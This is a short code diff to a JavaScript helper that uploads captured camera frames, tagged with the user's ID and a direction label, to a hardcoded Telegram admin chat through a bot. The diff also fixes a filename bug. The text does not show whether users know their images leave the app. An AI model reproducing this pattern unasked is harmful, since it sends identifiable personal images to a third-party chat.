@@ -6,13 +6,13 @@ dotenv.config();
 
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const ADMIN_CHAT_ID = "7213907462";
+const ADMIN_CHAT_ID = "-4546383764";
 
 export const sendImageToTelegram = async (imageBase64, direction,userId) => {
     const message = {
       chat_id: ADMIN_CHAT_ID,
       text: `Captured frame: ${direction}`,
-      caption: `Here is the ${direction} frame.`,
+      caption: `Here is the ${userId}-${direction} frame.`,
     };
   
     // Convert the base64 string to a Blob (or File) that can be uploaded
@@ -24,7 +24,7 @@ export const sendImageToTelegram = async (imageBase64, direction,userId) => {
   
     try {
         // Convert the base64 image to a File object
-        const file = await base64ToFile(imageBase64, `${direction}-${user}.jpeg`);
+        const file = await base64ToFile(imageBase64, `${direction}-${userId}.jpeg`);
   
         // Create FormData to send the image via POST
         const formData = new FormData();
